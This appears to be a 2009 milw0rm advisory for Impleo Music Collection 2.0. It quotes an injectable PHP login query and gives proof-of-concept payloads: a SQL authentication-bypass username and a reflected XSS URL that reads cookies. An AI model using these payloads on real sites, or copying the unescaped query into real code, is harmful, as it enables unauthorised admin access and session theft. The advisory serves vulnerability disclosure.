@@ -1,0 +1,35 @@
+#################################################################################################################
+[+] Impleo Music Collection 2.0 (SQL/XSS) Multiple Remote Vulnerabilities
+[+] Download: http://sappy.dk/impleo/download-impleo
+[+] Discovered By SirGod 
+[+] www.mortal-team.org
+#################################################################################################################
+
+[+] SQL Injection ( Auth Bypass )
+
+- Requirements : magic_quotes_gpc = off
+
+- Vulnerable code in /admin/login.php
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ $postbruger = $_POST['username'];
+ $postpass = md5($_POST['password']); 
+ $resultat = mysql_query("SELECT * FROM " . $tablestart . "login WHERE brugernavn = '$postbruger' AND password = '$postpass'") 
+or die("<p>" . mysql_error() . "</p>\n");
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+- PoC 
+
+  Login Username : admin ' or ' 1=1
+  Login Password : anything
+
+
+[+] Cross Site Scripting
+
+- PoC 
+
+    http://127.0.0.1/[path]/index.php?sort="><script>alert(document.cookie)</script>
+
+#################################################################################################################
+
+# milw0rm.com [2009-06-15]
